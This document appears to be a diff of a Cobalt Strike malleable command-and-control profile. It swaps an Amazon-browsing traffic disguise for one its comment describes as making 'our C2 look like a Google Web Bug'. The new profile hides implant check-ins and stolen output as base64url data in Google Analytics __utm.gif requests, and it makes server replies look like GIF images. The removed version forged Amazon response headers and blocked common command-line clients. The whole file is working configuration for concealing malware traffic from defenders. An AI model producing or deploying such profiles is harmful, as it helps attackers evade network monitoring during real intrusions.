@@ -1,94 +1,61 @@
+# make our C2 look like a Google Web Bug
+# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
 #
-# Amazon browsing traffic profile
-# 
-# Author: @harmj0y
-#
+# Author: @armitagehacker
 
 set sleeptime "5000";
-set jitter    "0";
-set maxdns    "255";
-set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
-
-http-config {
-    set headers "Connection, Content-Length, Date, Keep-Alive, Content-Type"; 
-    header "Server" "Apache";
-    header "Keep-Alive" "timeout=5, max=100";    
-    header "Connection" "Keep-Alive";
-    set trust_x_forwarded_for "true";
-    set block_useragents "curl*,lynx*,wget*";
-}
 
 http-get {
+	set uri "/___utm.gif";
+	client {
+		parameter "utmac" "UA-2202604-2";
+		parameter "utmcn" "1";
+		parameter "utmcs" "ISO-8859-1";
+		parameter "utmsr" "1280x1024";
+		parameter "utmsc" "32-bit";
+		parameter "utmul" "en-US";
 
-    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
+		metadata {
+			base64url;
+			header "utmcc";
+		}
+	}
 
-    client {
+	server {
+		header "Content-Type" "image/gif";
 
-        header "Accept" "*/*";
-        header "Host" "www.amazon.com";
-
-        metadata {
-            base64;
-            # prepend "session-token=";
-            # prepend "skin=noskin;";
-            # append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
-            # header "Cookie";
-			uri-append;
-        }
-    }
-
-    server {
-
-        header "Server" "Server";
-        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
-        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
-        header "X-Frame-Options" "SAMEORIGIN";
-        header "Content-Encoding" "gzip";
-
-        output {
-            print;
-        }
-    }
+		output {
+			print;
+		}
+	}
 }
 
 http-post {
-    
-    set uri "/N4215/adj/amzn.us.sr.aps";
+	set uri "/__utm.gif";
+	set verb "GET";
+	client {
+		id {
+			parameter "utmac";
+		}
 
-    client {
+		parameter "utmcn" "1";
+		parameter "utmcs" "ISO-8859-1";
+		parameter "utmsr" "1280x1024";
+		parameter "utmsc" "32-bit";
+		parameter "utmul" "en-US";
 
-        header "Accept" "*/*";
-        header "Content-Type" "text/xml";
-        header "X-Requested-With" "XMLHttpRequest";
-        header "Host" "www.amazon.com";
+		output {
+			base64url;
+			header "utmcc";
+		}
+	}
 
-        parameter "sz" "160x600";
-        parameter "oe" "oe=ISO-8859-1;";
+	server {
+		header "Content-Type" "image/gif";
 
-        id {
-            parameter "sn";
-        }
-
-        parameter "s" "3717";
-        parameter "dc_ref" "http%3A%2F%2Fwww.amazon.com";
-
-        output {
-            base64;
-            print;
-        }
-    }
-
-    server {
-
-        header "Server" "Server";
-        header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
-        header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
-        header "X-Frame-Options" "SAMEORIGIN";
-        header "x-ua-compatible" "IE=edge";
-
-        output {
-		# 
-            print;
-        }
-    }
+		output {
+			print;
+		}
+	}
 }
+
